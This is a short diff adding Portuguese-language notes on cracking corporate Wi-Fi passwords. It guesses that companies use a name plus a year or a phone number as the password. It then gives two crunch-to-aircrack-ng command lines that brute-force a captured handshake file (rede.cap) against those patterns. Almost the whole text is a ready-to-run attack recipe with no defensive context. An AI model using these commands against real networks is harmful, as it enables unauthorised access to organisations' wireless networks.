@@ -1,0 +1,6 @@
+-Normalmente em empresas é utilizada a combinção (nome@ano, nomeano, Nomeano)
+	-Contar a quantidade de caracteres que tera a senha e montar com crunch
+	#crunch 8 8 -t nome%%%% 0123456789 | aircrack-ng rede.cap -w - -e <NOME_REDE(BSSID)>
+	
+	-Caso suspeite que a empresa usa numero de teefone como senha:
+	#crunch 8 8 -t %%%%%%%% 0123456789 | aircrack-ng rede.cap -w - -e <NOME_REDE(BSSID)>
